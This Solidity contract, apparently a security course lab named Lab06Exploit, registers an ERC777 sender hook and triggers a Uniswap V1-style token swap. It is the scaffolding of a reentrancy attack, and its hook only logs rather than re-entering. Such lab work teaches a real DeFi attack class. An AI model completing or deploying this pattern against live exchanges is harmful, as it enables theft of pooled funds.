// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "./ERC777/IERC777Sender.sol";
import "./ERC777/IERC1820Registry.sol";
import "./ERC20/IERC20.sol";

interface UniswapExchange {
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
    function ethToTokenSwapInput(uint256 min_tokens, uint256 deadline) external payable returns (uint256);
}

contract Lab06Exploit is IERC777Sender {
    UniswapExchange private exchange;
    IERC20 private token;
    IERC1820Registry private ERC1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    address owner;

    constructor(address _exchangeAddress, address _tokenAddress) public {
        exchange = UniswapExchange(_exchangeAddress);
        token = IERC20(_tokenAddress);
        owner = msg.sender;

        // register a hook
        ERC1820.setInterfaceImplementer(address(this), keccak256("ERC777TokensSender"), address(this));
    }

    // ERC777 hook
    event Log(string log);
    function tokensToSend(address, address, address, uint256, bytes calldata, bytes calldata) external {
        emit Log("triggered?");
    }

    function testMe() external {
        token.approve(address(exchange), 1);
        exchange.tokenToEthSwapInput(1, 1, block.timestamp * 2);
    }

    receive() external payable {}
}
